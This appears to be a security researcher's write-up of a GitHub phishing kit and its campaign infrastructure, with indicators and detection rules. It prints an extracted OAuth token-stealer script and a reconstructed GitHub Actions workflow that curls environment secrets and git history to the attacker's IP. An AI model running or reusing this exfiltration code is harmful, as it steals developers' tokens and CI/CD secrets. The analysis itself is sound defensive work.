On October 10, 2026 I received a phishing email from `security@my-github[.]com`, registered 29 hours earlier.
I pulled the origin IP, browsed to it with a test token, and captured the phishing page before the server blocked me.
In the page source: an OAuth stealer with a hardcoded Client ID pointing straight to the operator's GitHub account.

The infrastructure belongs to [GhostAction](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/): a supply-chain campaign that injects malicious GitHub Actions workflows into public repos to steal CI/CD secrets, active since September 2025 across 3,000+ repositories.
The operator account and OAuth app behind this wave had not been publicly documented.

## The email

Near-perfect clone of a GitHub security alert.
Same Primer CSS, same layout.
Two tells: the sender domain and the 29-hour registration.

|---|---|---|
| Sender | `security@my-github[.]com` | Registered Oct 9 at Dynadot |

## The infrastructure

`my-github[.]com` sits behind Cloudflare. Origin: `193[.]32[.]204[.]199`. Mail relay: `193[.]32[.]204[.]3`.

<InfraMap />

### Phishing server: 193[.]32[.]204[.]199

RIPE WHOIS: allocated to "Vigilant Cyber SAS" at "12 Rue de la Securite, Paris" (literally "12 Security Street").
The IP block was sub-allocated by [Hop Bilisim Teknolojileri A.S.](https://www.hopbilisim.com.tr/), a Local Internet Registry in Istanbul that manages 136 RIPE objects and routinely sub-allocates /24 blocks to shell organizations.
Transit via [M247](https://m247.com/) (Romania), peered through Finland (hence GeoIP resolving to Helsinki).

[AbuseIPDB](https://www.abuseipdb.com/check/193.32.204.199): 100% abuse confidence, 5,007 reports, 957 distinct reporters.

<PortMap />

### Mail relay: 193[.]32[.]204[.]3

Runs [FASTPANEL](https://fastpanel.direct/) with [Exim 4.97](https://www.exim.org/). SMTP TLS certificate:

```text title="SMTP TLS certificate on .3" frame="code"
C=EE, ST=Tallinn, L=Tallinn, O=CompanyName, OU=User, CN=etc
Issued: 2026-09-04
```

Tallinn, not Paris.
Issued September 4, same day as the FASTPANEL self-signed cert.
Different SSH host keys on `.199` and `.3` confirm separate VMs.

### Subnet co-tenants

`slon7[.]com` on `.7-.9`: crypto-drainer (suspended).
`mega[.]reviews` on `.10-.11`: parked.
Phishing + C2 at `.199`, mail relay at `.3`.

## The phishing kit

Browsed to the phishing URL with a test token and saved the page before the server blacklisted my IP.

| Property | Value |
|---|---|
| Size | 51,759 bytes |
| Frontend | React + GitHub Primer CSS, all themes |
| Feature flags | 100+ `data-feature-*` attributes (matching real GitHub) |
| Backend | Python 3.10 `BaseHTTPServer` (from server headers) |
| Framework | Custom (not [Evilginx](https://github.com/kgretzky/evilginx2) or [Modlishka](https://github.com/drk1wi/Modlishka)) |
| Stealer script | 3,334 bytes, 13th `<script>` tag |

The kit splits across three subdomains: `github.my-github[.]com` proxies the login (79 requests), `api.my-github[.]com` proxies API calls, and `collector.my-github[.]com` receives exfiltrated data ([CIRCL Lookyloo capture](https://lookyloo.circl.lu/)).
The login form POSTs to `/session` on the proxy, which relays to real `github.com` (adversary-in-the-middle).
The victim authenticates against the real backend, MFA included.

After login, the stealer script polls the DOM for the victim's avatar to confirm authentication, waits 3 seconds, then abuses the [OAuth device flow](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps#device-flow).
The kit automates the entire flow inside the victim's already-authenticated session:

```js title="Extracted token stealer (script 13, 3334 bytes)" frame="code"
var CID = "Ov23ctrqCqZ79UaYKwyq";

// Step 1: request device code
fetch("/login/device/code", {
  method: "POST",
  body: "client_id=" + CID + "&scope=repo+workflow+read:org",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json"
  },
  credentials: "same-origin",
})

// Steps 2-4: auto-fill user_code, auto-approve authorization
// (victim's authenticated session handles consent silently)

// Step 5: exfiltrate token to C2
fetch("hxxps://my-github[.]com:8443/t?value=" + td.access_token
  + "&user=" + encodeURIComponent(vu), { mode: "no-cors" });
```

### Cloaking

Three layers of visitor filtering:

- **No tracking token**: redirect to `github.com` with `no-referrer`
- **Tor exit node**: same redirect
- **Repeated requests**: connection dropped entirely

```html title="Default response (non-victims)" frame="code"
<html><head>
  <meta name='referrer' content='no-referrer'>
  <script>top.location.href='https://github.com';</script>
</head></html>
```

## The operator

The Client ID hardcoded in the stealer script (`Ov23ctrqCqZ79UaYKwyq`) is a registered [GitHub OAuth App](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/differences-between-github-apps-and-oauth-apps).
Looking it up on GitHub's authorization page reveals both the app and its owner:

<Operator />

![OAuth consent page showing CI Notifier by ookefokzkoed](/images/ghostaction/02-oauth-app-ci-notifier.png)

Callback `devtools-ci[.]com` has never been registered (no DNS, no cert on crt.sh).
The app was still issuing device codes at 15:49 UTC, over an hour after my email.

### Attribution signals

The username `ookefokzkoed` is a keyboard mash: no dictionary words, no leet-speak pattern, just fingers hitting keys fast to generate a throwaway handle.
But which keys depends on the keyboard layout.
The string contains `z` twice.
On [QWERTY](https://en.wikipedia.org/wiki/QWERTY), `z` sits on the bottom row, a deliberate reach away from the home keys.
On [AZERTY](https://en.wikipedia.org/wiki/AZERTY) (France/Belgium), `z` is on the top row, position 2, right under the fingers.
Every character in the username maps to the top or home row of AZERTY:

## The campaign

`193[.]32[.]204[.]199` has been active since at least August 2026 as GhostAction's primary C2.
The phishing page is an escalation from passive workflow injection to active credential theft.

<Waves />

Wave 5 is self-sustaining: phishing steals OAuth tokens with `repo`+`workflow`+`read:org`.
Tokens push malicious workflows.
Workflows harvest secrets.
Compromised accounts send more phishing.

### The malicious workflow

The workflows pushed to infected repos (`security-audit.yml`, `github_actions_security.yml`) run on every push and pull request.
They dump every CI/CD secret and the full git history to the C2:

```yaml title="Reconstructed security-audit.yml (from public reporting)" frame="code"
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0     # full git history

      # exfil all env vars (includes GITHUB_TOKEN, API keys, deploy creds)
      - run: |
          curl -s "http://193[.]32[.]204[.]199/?c=monami" \
            -d "$(env | base64)"

      # exfil git history
      - run: |
          git log --all --oneline | \
            curl -s "http://193[.]32[.]204[.]199/?c=new" -d @-

      # structured exfil with repo identifier
      - run: |
          curl -s "http://193[.]32[.]204[.]199:3000/api/workflow/receive?inj=${{ github.repository }}" \
            -d "$(env | grep -i secret | base64)"
```

## IOCs

<IocTable />

### Detection

GitHub audit log query for organizations:

```text title="Audit log filter" frame="code"
action:oauth_application.access_granted oauth_application_name:"CI Notifier"
```

Check your local repos for malicious workflows:

```bash title="Local detection" frame="code"
# search workflow file contents for the C2 IP
grep -r "193\.32\.204" .github/workflows/
# find the known malicious workflow filenames
find .github/workflows -name "security-audit.yml" -o -name "github_actions_security.yml"
```

Network indicators for SIEM rules:

```text title="Suricata-style signatures" frame="code"
alert http any any -> 193.32.204.199 any (msg:"GhostAction C2 monami"; content:"/?c=monami"; sid:2026101001;)
alert http any any -> 193.32.204.199 any (msg:"GhostAction C2 new"; content:"/?c=new"; sid:2026101002;)
alert tls any any -> any any (msg:"GhostAction phish domain"; tls.sni; content:"my-github.com"; sid:2026101003;)
```

### Check your account

1. Open [github.com/settings/applications](https://github.com/settings/applications)
2. If "CI Notifier" or `Ov23ctrqCqZ79UaYKwyq` appears, revoke it
3. Search your repos for `security-audit.yml` or `github_actions_security.yml` containing `193.32.204`
4. If found: delete the workflow, rotate every secret the token had access to
